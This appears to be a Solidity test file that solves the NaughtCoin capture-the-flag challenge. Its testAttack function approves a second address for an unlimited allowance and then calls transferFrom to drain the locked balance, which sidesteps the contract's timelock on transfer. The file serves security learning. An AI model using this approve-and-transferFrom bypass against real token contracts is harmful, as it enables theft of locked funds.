// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {FetherTestSuite} from "../utils/FetherTestSuite.sol";
import {NaughtCoin} from "../../src/NaughtCoin/NaughtCoin.sol";

contract NaughtCoinTest is FetherTestSuite {
  NaughtCoin nc;

  address deployer = address(100);
  address attacker = address(101);
 
  function setUp() public {
    vm.startPrank(deployer);
    nc = new NaughtCoin(attacker);
    vm.stopPrank();
  }

  function testAttack() public {
    vm.startPrank(attacker, attacker);
    
    address malicious = address(102);
    assert(nc.approve(malicious, uint(-1)));
    vm.stopPrank();
    vm.startPrank(malicious);
    assert(nc.allowance(attacker, malicious) > 0);
    assert(nc.transferFrom(attacker, malicious, nc.balanceOf(attacker)));

    assertNull(nc.balanceOf(attacker));
  }
}
